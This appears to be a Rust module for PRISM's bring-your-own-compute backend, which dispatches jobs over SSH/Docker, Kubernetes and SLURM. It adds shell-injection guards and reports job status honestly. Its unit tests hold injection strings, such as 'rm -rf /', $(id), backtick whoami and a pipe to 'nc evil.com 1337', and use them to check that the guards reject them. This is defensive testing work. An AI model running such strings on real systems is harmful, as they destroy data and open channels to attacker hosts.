//! Bring-your-own-compute backend.
//!
//! Routes jobs to user-provided infrastructure — SSH-accessible machines,
//! Kubernetes clusters, or SLURM schedulers. The BYOC backend translates
//! PRISM job specs into the target system's native submission format.

use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::{ComputeBackend, ExperimentPlan, JobStatus};

/// Supported BYOC target types.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ByocTarget {
    /// SSH to a remote machine, run via Docker.
    Ssh {
        host: String,
        user: String,
        key_path: String,
        port: u16,
    },
    /// Submit to a Kubernetes cluster.
    Kubernetes { context: String, namespace: String },
    /// Submit to a SLURM scheduler.
    Slurm {
        head_node: String,
        user: String,
        partition: String,
    },
}

impl Default for ByocTarget {
    fn default() -> Self {
        ByocTarget::Ssh {
            host: "localhost".into(),
            user: "prism".into(),
            key_path: "~/.ssh/id_ed25519".into(),
            port: 22,
        }
    }
}

/// Bring-your-own-compute backend.
pub struct ByocBackend {
    target: ByocTarget,
}

impl ByocBackend {
    pub fn new(target: ByocTarget) -> Self {
        Self { target }
    }

    /// Build an SSH command prefix for the target host.
    fn ssh_cmd(host: &str, user: &str, key_path: &str, port: u16) -> tokio::process::Command {
        let mut cmd = tokio::process::Command::new("ssh");
        cmd.args([
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "BatchMode=yes",
            "-i",
            key_path,
            "-p",
            &port.to_string(),
            &format!("{user}@{host}"),
        ]);
        cmd
    }
}

#[async_trait]
impl ComputeBackend for ByocBackend {
    async fn submit(&self, plan: &ExperimentPlan) -> Result<Uuid> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // Validate image as a Docker reference — alphanumeric +
                // a small set of separators. Without this, an LLM-
                // generated tool call (or any caller passing untrusted
                // text) could pass `ubuntu; rm -rf /; #` and the
                // remote shell would execute it. See Bug #54.
                if !is_valid_docker_image(&plan.image) {
                    bail!(
                        "invalid docker image reference {:?}: must match \
                         [A-Za-z0-9._/:@-]+",
                        plan.image
                    );
                }

                // SSH to host → docker run with inputs piped via env var.
                // Single-quote-escape all interpolated values so JSON
                // payloads / image names containing apostrophes can't
                // break out of the quoted string and inject shell
                // commands. The shell-quote sequence `'\''` closes the
                // quote, escapes a literal apostrophe, and reopens.
                let docker_cmd = format!(
                    "docker run -d --name prism-job-{job_id} \
                     -e PRISM_JOB_ID={job_id} \
                     -e PRISM_INPUTS={inputs_q} \
                     {image_q}",
                    inputs_q = sh_single_quote(&inputs_json),
                    image_q = sh_single_quote(&plan.image),
                );

                tracing::info!(
                    %host, %user, %job_id, image = %plan.image,
                    "BYOC SSH: submitting job"
                );

                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(&docker_cmd);

                let output = cmd
                    .output()
                    .await
                    .with_context(|| format!("SSH to {user}@{host}:{port} failed"))?;

                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("SSH docker run failed: {stderr}");
                }

                let container_id = String::from_utf8_lossy(&output.stdout).trim().to_string();
                tracing::info!(%job_id, %container_id, "BYOC SSH: container started");

                Ok(job_id)
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // kubectl run as a Job
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "run",
                    &format!("prism-{job_id}"),
                    "--image",
                    &plan.image,
                    "--restart=Never",
                    "--env",
                    &format!("PRISM_JOB_ID={job_id}"),
                    "--env",
                    &format!("PRISM_INPUTS={inputs_json}"),
                ]);

                tracing::info!(
                    %context, %namespace, %job_id, image = %plan.image,
                    "BYOC K8s: submitting job"
                );

                let output = cmd.output().await.context("kubectl run failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("kubectl run failed: {stderr}");
                }

                Ok(job_id)
            }
            ByocTarget::Slurm {
                head_node,
                user,
                partition,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // Same image validation as the SSH path. The SLURM script
                // executes `singularity exec docker://{image}` on the head
                // node — without validation an LLM-controlled image
                // string would land in the SBATCH script and run on
                // the cluster. See Bug #54.
                if !is_valid_docker_image(&plan.image) {
                    bail!(
                        "invalid docker image reference {:?}: must match \
                         [A-Za-z0-9._/:@-]+",
                        plan.image
                    );
                }

                // SSH to SLURM head node → sbatch a singularity/docker job.
                // PRISM_INPUTS uses the same single-quote-escape helper
                // as the SSH path so JSON apostrophes can't break out.
                let sbatch_script = format!(
                    "#!/bin/bash\n\
                     #SBATCH --job-name=prism-{job_id}\n\
                     #SBATCH --partition={partition}\n\
                     #SBATCH --output=/tmp/prism-{job_id}.out\n\
                     export PRISM_JOB_ID={job_id}\n\
                     export PRISM_INPUTS={inputs_q}\n\
                     singularity exec docker://{image} /entrypoint.sh\n",
                    image = plan.image,
                    inputs_q = sh_single_quote(&inputs_json),
                );

                let ssh_cmd = format!("echo '{}' | sbatch", sbatch_script.replace('\'', "'\\''"));

                tracing::info!(
                    %head_node, %user, %partition, %job_id,
                    "BYOC SLURM: submitting job"
                );

                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &ssh_cmd,
                ]);

                let output = cmd
                    .output()
                    .await
                    .context("SSH to SLURM head node failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("sbatch submission failed: {stderr}");
                }

                Ok(job_id)
            }
        }
    }

    async fn status(&self, job_id: Uuid) -> Result<JobStatus> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                // Ask for the exit code too. Reporting a container that exited
                // 137 (OOM-killed) as `Completed` — the old behaviour, which
                // only read `.State.Status` — told the user their job
                // succeeded when it had died.
                cmd.arg(format!(
                    "docker inspect --format '{{{{.State.Status}}}}:{{{{.State.ExitCode}}}}' \
                     prism-job-{job_id}"
                ));
                let output = cmd.output().await?;
                interpret_remote_inspect(
                    job_id,
                    output.status.success(),
                    &output.stdout,
                    &output.stderr,
                )
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "get",
                    "pod",
                    &format!("prism-{job_id}"),
                    "-o",
                    "jsonpath={.status.phase}",
                ]);
                let output = cmd.output().await?;
                interpret_k8s_phase(
                    job_id,
                    output.status.success(),
                    &output.stdout,
                    &output.stderr,
                )
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("squeue --name=prism-{job_id} --noheader -o %T"),
                ]);
                let output = cmd.output().await?;
                interpret_slurm_state(
                    job_id,
                    output.status.success(),
                    &output.stdout,
                    &output.stderr,
                )
            }
        }
    }

    async fn results(&self, job_id: Uuid) -> Result<serde_json::Value> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker logs prism-job-{job_id}"));
                let output = cmd.output().await?;
                // A failed `ssh … docker logs` used to yield `{"output": ""}` —
                // indistinguishable from a container that legitimately printed
                // nothing. With no result.json the logs ARE the result, so a
                // collection failure must be an error, not empty-as-success.
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!(
                        "could not fetch remote logs for job {job_id} from {user}@{host}:{port}: {}",
                        stderr.trim()
                    );
                }
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                // `docker logs` demuxes to our fds, so container stdout and
                // stderr arrive separately. Try structured JSON first (an image
                // may print a result document), else report both streams.
                match serde_json::from_str(stdout.trim()) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({
                        "stdout": stdout,
                        "stderr": stderr,
                    })),
                }
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "logs",
                    &format!("prism-{job_id}"),
                ]);
                let output = cmd.output().await?;
                // Same rule as the SSH arm: a failed `kubectl logs` must not
                // masquerade as a pod that printed nothing.
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!(
                        "could not fetch pod logs for job {job_id} from context {context}/{namespace}: {}",
                        stderr.trim()
                    );
                }
                Ok(logs_to_result(&output.stdout))
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("cat /tmp/prism-{job_id}.out"),
                ]);
                let output = cmd.output().await?;
                // `cat` on a missing file exits non-zero. Reporting that as an
                // empty result would claim the job produced no output when in
                // fact its output file is not there (or we never reached the
                // head node).
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!(
                        "could not read /tmp/prism-{job_id}.out on {user}@{head_node}: {}",
                        stderr.trim()
                    );
                }
                Ok(logs_to_result(&output.stdout))
            }
        }
    }

    async fn cancel(&self, job_id: Uuid) -> Result<()> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker rm -f prism-job-{job_id}"));
                cmd.output().await.context("SSH cancel failed")?;
                Ok(())
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "delete",
                    "pod",
                    &format!("prism-{job_id}"),
                ]);
                cmd.output().await.context("kubectl delete failed")?;
                Ok(())
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("scancel --name=prism-{job_id}"),
                ]);
                cmd.output().await.context("scancel failed")?;
                Ok(())
            }
        }
    }
}

// ── Shell-injection helpers (Bug #54) ───────────────────────────────────

/// Wrap a value in POSIX single quotes, escaping any internal `'` as
/// `'\''` (close-quote, escaped-apostrophe, reopen-quote). The result
/// is safe to embed in any single-shell-pipeline `bash -c` argument.
///
/// Used by the BYOC SSH path where we have to send a `docker run …`
/// command line through ssh's remote shell. Without this wrapping a
/// JSON payload containing a `'` would break out of the quoting and
/// let the rest be interpreted as a separate shell command.
fn sh_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Interpret a remote `docker inspect --format '{{.State.Status}}:{{.State.ExitCode}}'`
/// into a [`JobStatus`]. Pure, so the honesty rules are testable without SSH.
///
/// Two lies this replaces:
///
/// 1. `exited` was mapped to `Completed` regardless of exit code, so a crashed
///    remote container reported success.
/// 2. When SSH itself failed (host down, key rejected, `docker` not installed)
///    stdout was empty, and the empty string fell through to
///    `Failed { "container status: " }` — reporting the user's JOB as failed
///    when in truth we never reached the machine. Now that is an `Err`: a loud
///    "could not reach the box", which the poll loop retries and the CLI
///    surfaces with the real stderr.
fn interpret_remote_inspect(
    job_id: Uuid,
    ssh_ok: bool,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<JobStatus> {
    let raw = String::from_utf8_lossy(stdout);
    let raw = raw.trim();

    if !ssh_ok || raw.is_empty() {
        let stderr = String::from_utf8_lossy(stderr);
        bail!(
            "could not inspect remote container for job {job_id}: {}",
            if stderr.trim().is_empty() {
                "ssh produced no output (host unreachable, auth refused, or docker missing)"
            } else {
                stderr.trim()
            }
        );
    }

    let (status, exit_code) = raw.split_once(':').unwrap_or((raw, "1"));
    Ok(match status {
        "running" | "created" | "restarting" => JobStatus::Running { progress: 0.0 },
        "paused" => JobStatus::Running { progress: 0.0 },
        "exited" | "dead" => {
            let code: i32 = exit_code.trim().parse().unwrap_or(1);
            if code == 0 {
                JobStatus::Completed
            } else {
                JobStatus::Failed {
                    error: format!("remote container exited with code {code}"),
                }
            }
        }
        other => JobStatus::Failed {
            error: format!("unexpected remote container status: {other}"),
        },
    })
}

/// Wrap captured job output as a result document: structured JSON when the job
/// printed a JSON document, otherwise the raw text under `output`.
fn logs_to_result(stdout: &[u8]) -> serde_json::Value {
    let logs = String::from_utf8_lossy(stdout).to_string();
    match serde_json::from_str(logs.trim()) {
        Ok(v) => v,
        Err(_) => serde_json::json!({ "output": logs }),
    }
}

/// Interpret `kubectl get pod -o jsonpath={.status.phase}` into a [`JobStatus`].
///
/// A failed `kubectl` (no cluster, wrong context, pod deleted) used to fall
/// through the catch-all to `Queued` — telling the user their job was patiently
/// waiting when in truth we could not talk to the cluster at all. That is now a
/// loud error the poll loop can retry and the CLI reports honestly.
fn interpret_k8s_phase(
    job_id: Uuid,
    kubectl_ok: bool,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<JobStatus> {
    let phase = String::from_utf8_lossy(stdout);
    let phase = phase.trim();

    if !kubectl_ok || phase.is_empty() {
        let stderr = String::from_utf8_lossy(stderr);
        bail!(
            "could not read pod phase for job {job_id}: {}",
            if stderr.trim().is_empty() {
                "kubectl produced no output (cluster unreachable, wrong context, or pod gone)"
            } else {
                stderr.trim()
            }
        );
    }

    Ok(match phase {
        "Running" => JobStatus::Running { progress: 0.0 },
        "Pending" => JobStatus::Queued,
        "Succeeded" => JobStatus::Completed,
        "Failed" => JobStatus::Failed {
            error: "pod failed".into(),
        },
        other => JobStatus::Failed {
            error: format!("unexpected pod phase: {other}"),
        },
    })
}

/// Interpret `squeue --noheader -o %T` into a [`JobStatus`].
///
/// The dangerous case is the EMPTY result. `squeue` prints nothing both when a
/// job has finished and left the queue AND when the job id never existed, when
/// the partition is wrong, or when the ssh succeeded but slurm is not
/// installed. The old code mapped empty to `Completed` — reporting success for
/// a job that may never have run. Empty is now reported as an error telling the
/// caller to confirm with the accounting DB (`sacct`), which is the only
/// authority on a finished job's real exit state.
fn interpret_slurm_state(
    job_id: Uuid,
    ssh_ok: bool,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<JobStatus> {
    let state = String::from_utf8_lossy(stdout);
    let state = state.trim();

    if !ssh_ok {
        let stderr = String::from_utf8_lossy(stderr);
        bail!(
            "could not query SLURM for job {job_id}: {}",
            if stderr.trim().is_empty() {
                "ssh to the head node produced no output"
            } else {
                stderr.trim()
            }
        );
    }

    if state.is_empty() {
        bail!(
            "SLURM job prism-{job_id} is not in the queue. That means it finished, \
             was never submitted, or squeue is unavailable — squeue alone cannot \
             tell these apart, so this is reported as unknown rather than guessed \
             as success. Confirm with: sacct --name=prism-{job_id} --format=State,ExitCode"
        );
    }

    Ok(match state {
        "RUNNING" | "COMPLETING" => JobStatus::Running { progress: 0.0 },
        "PENDING" | "CONFIGURING" => JobStatus::Queued,
        "COMPLETED" => JobStatus::Completed,
        "CANCELLED" => JobStatus::Cancelled,
        "FAILED" | "TIMEOUT" | "NODE_FAIL" | "OUT_OF_MEMORY" => JobStatus::Failed {
            error: state.to_string(),
        },
        other => JobStatus::Failed {
            error: format!("unexpected SLURM state: {other}"),
        },
    })
}

/// Validate a Docker image reference. Permissive enough to accept all
/// real-world tags (digests, registries, ports, namespaces) but
/// strict enough to reject obvious shell-injection attempts.
fn is_valid_docker_image(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 256
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | ':' | '-' | '@'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_byoc_is_ssh() {
        let target = ByocTarget::default();
        assert!(matches!(target, ByocTarget::Ssh { .. }));
    }

    #[test]
    fn byoc_target_serializes() {
        let target = ByocTarget::Kubernetes {
            context: "prod".into(),
            namespace: "prism".into(),
        };
        let json = serde_json::to_string(&target).unwrap();
        assert!(json.contains("Kubernetes"));
        assert!(json.contains("prism"));
    }

    #[test]
    fn slurm_target_serializes() {
        let target = ByocTarget::Slurm {
            head_node: "hpc.lab.internal".into(),
            user: "researcher".into(),
            partition: "gpu".into(),
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Slurm {
            head_node,
            partition,
            ..
        } = back
        {
            assert_eq!(head_node, "hpc.lab.internal");
            assert_eq!(partition, "gpu");
        } else {
            panic!("expected Slurm");
        }
    }

    #[test]
    fn ssh_target_roundtrip() {
        let target = ByocTarget::Ssh {
            host: "gpu-box.lab".into(),
            user: "admin".into(),
            key_path: "/home/admin/.ssh/id_ed25519".into(),
            port: 2222,
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Ssh { host, port, .. } = back {
            assert_eq!(host, "gpu-box.lab");
            assert_eq!(port, 2222);
        } else {
            panic!("expected Ssh");
        }
    }

    #[test]
    fn sh_single_quote_wraps_plain_string() {
        assert_eq!(sh_single_quote("hello"), "'hello'");
    }

    #[test]
    fn sh_single_quote_escapes_apostrophe() {
        // The classic injection — a stray apostrophe must be replaced
        // with the close-escape-reopen sequence so the payload stays
        // contained inside the quoted string.
        assert_eq!(sh_single_quote("don't"), r"'don'\''t'");
    }

    #[test]
    fn sh_single_quote_handles_injection_payload() {
        // Realistic injection: JSON-ish input that ends with `'); rm -rf /; #`
        // would close the wrapping quote and execute the rest. Verify
        // the escape neutralises it.
        let payload = "{\"k\":\"v\"}'); rm -rf /; #";
        let q = sh_single_quote(payload);
        // The result must start and end with `'` and contain no
        // unescaped apostrophe in between.
        assert!(q.starts_with('\''));
        assert!(q.ends_with('\''));
        // Apostrophes are present only as the escape sequence.
        let inner = &q[1..q.len() - 1];
        // Every literal ' becomes '\''  → split on '\'' produces N+1 pieces
        // none of which contain a bare '.
        for piece in inner.split(r"'\''") {
            assert!(!piece.contains('\''), "unescaped quote in {piece}");
        }
    }

    #[test]
    fn is_valid_docker_image_accepts_real_refs() {
        assert!(is_valid_docker_image("ubuntu"));
        assert!(is_valid_docker_image("ubuntu:22.04"));
        assert!(is_valid_docker_image("ghcr.io/user/repo:latest"));
        assert!(is_valid_docker_image(
            "gcr.io/proj/img@sha256:abcdef0123456789"
        ));
        assert!(is_valid_docker_image("registry.local:5000/img:v1"));
    }

    // --- Remote status honesty (no SSH needed) ---

    #[test]
    fn remote_inspect_exit_zero_is_completed() {
        let status = interpret_remote_inspect(Uuid::new_v4(), true, b"exited:0\n", b"").unwrap();
        assert!(matches!(status, JobStatus::Completed));
    }

    #[test]
    fn remote_inspect_nonzero_exit_is_failed_not_completed() {
        // The lie this replaces: `.State.Status == "exited"` alone was mapped
        // to Completed, so an OOM-killed (137) remote job reported success.
        let status = interpret_remote_inspect(Uuid::new_v4(), true, b"exited:137\n", b"").unwrap();
        match status {
            JobStatus::Failed { error } => assert!(error.contains("137"), "got: {error}"),
            other => panic!("a non-zero remote exit must be Failed, got {other:?}"),
        }
    }

    #[test]
    fn remote_inspect_running_is_running() {
        let status = interpret_remote_inspect(Uuid::new_v4(), true, b"running:0\n", b"").unwrap();
        assert!(matches!(status, JobStatus::Running { .. }));
    }

    #[test]
    fn unreachable_host_is_an_error_not_a_failed_job() {
        // The second lie: when ssh failed, stdout was empty and the empty
        // string fell through to Failed{"container status: "} — blaming the
        // user's job for our inability to reach the machine.
        let result = interpret_remote_inspect(
            Uuid::new_v4(),
            false,
            b"",
            b"ssh: connect to host gpu-box.lab port 22: Connection refused",
        );
        assert!(
            result.is_err(),
            "an unreachable host must be Err, not Ok(Failed) — the job did not fail, we did"
        );
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Connection refused"), "got: {msg}");
    }

    #[test]
    fn empty_ssh_output_with_success_status_is_still_an_error() {
        // Some ssh configurations exit 0 while producing nothing. Empty output
        // is not evidence of a container state, so it must not be guessed at.
        let result = interpret_remote_inspect(Uuid::new_v4(), true, b"   \n", b"");
        assert!(result.is_err(), "empty inspect output must not be guessed");
    }

    // --- Kubernetes status honesty (no cluster needed) ---

    #[test]
    fn k8s_phases_map_to_the_right_states() {
        let id = Uuid::new_v4();
        assert!(matches!(
            interpret_k8s_phase(id, true, b"Succeeded", b"").unwrap(),
            JobStatus::Completed
        ));
        assert!(matches!(
            interpret_k8s_phase(id, true, b"Running", b"").unwrap(),
            JobStatus::Running { .. }
        ));
        assert!(matches!(
            interpret_k8s_phase(id, true, b"Pending", b"").unwrap(),
            JobStatus::Queued
        ));
        assert!(matches!(
            interpret_k8s_phase(id, true, b"Failed", b"").unwrap(),
            JobStatus::Failed { .. }
        ));
    }

    #[test]
    fn unreachable_cluster_is_an_error_not_queued() {
        // The lie this replaces: a failed kubectl fell through the catch-all to
        // Queued, so "cluster unreachable" looked like "your job is waiting".
        let result = interpret_k8s_phase(
            Uuid::new_v4(),
            false,
            b"",
            b"error: context \"kind-gone\" does not exist",
        );
        assert!(
            result.is_err(),
            "an unreachable cluster must not read as Queued"
        );
        assert!(result.unwrap_err().to_string().contains("does not exist"));
    }

    // --- SLURM status honesty (no cluster needed) ---

    #[test]
    fn slurm_states_map_to_the_right_states() {
        let id = Uuid::new_v4();
        assert!(matches!(
            interpret_slurm_state(id, true, b"COMPLETED", b"").unwrap(),
            JobStatus::Completed
        ));
        assert!(matches!(
            interpret_slurm_state(id, true, b"RUNNING", b"").unwrap(),
            JobStatus::Running { .. }
        ));
        assert!(matches!(
            interpret_slurm_state(id, true, b"PENDING", b"").unwrap(),
            JobStatus::Queued
        ));
        assert!(matches!(
            interpret_slurm_state(id, true, b"CANCELLED", b"").unwrap(),
            JobStatus::Cancelled
        ));
        assert!(matches!(
            interpret_slurm_state(id, true, b"OUT_OF_MEMORY", b"").unwrap(),
            JobStatus::Failed { .. }
        ));
    }

    #[test]
    fn empty_squeue_output_is_unknown_not_completed() {
        // The most dangerous lie in the old code: squeue prints nothing both
        // for a finished job AND for one that never existed / a broken slurm,
        // and empty was mapped to Completed — reporting success for a job that
        // may never have run.
        let result = interpret_slurm_state(Uuid::new_v4(), true, b"", b"");
        assert!(
            result.is_err(),
            "an empty squeue result must not be reported as success"
        );
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("sacct"),
            "the error should tell the user how to get the real answer: {msg}"
        );
    }

    #[test]
    fn slurm_ssh_failure_is_an_error() {
        let result = interpret_slurm_state(
            Uuid::new_v4(),
            false,
            b"",
            b"ssh: Could not resolve hostname hpc.lab.internal",
        );
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("resolve hostname"));
    }

    #[test]
    fn logs_to_result_prefers_structured_json_else_wraps_text() {
        let structured = logs_to_result(br#"{"score": 0.9}"#);
        assert_eq!(structured["score"], serde_json::json!(0.9));

        let plain = logs_to_result(b"hello\n");
        assert_eq!(plain["output"], serde_json::json!("hello\n"));
    }

    #[test]
    fn is_valid_docker_image_rejects_injection_attempts() {
        assert!(!is_valid_docker_image(""));
        assert!(!is_valid_docker_image("ubuntu; rm -rf /"));
        assert!(!is_valid_docker_image("ubuntu\nfoo"));
        assert!(!is_valid_docker_image("ubuntu`whoami`"));
        assert!(!is_valid_docker_image("ubuntu$(id)"));
        assert!(!is_valid_docker_image("ubuntu | nc evil.com 1337"));
        assert!(!is_valid_docker_image(&"a".repeat(257)));
    }
}
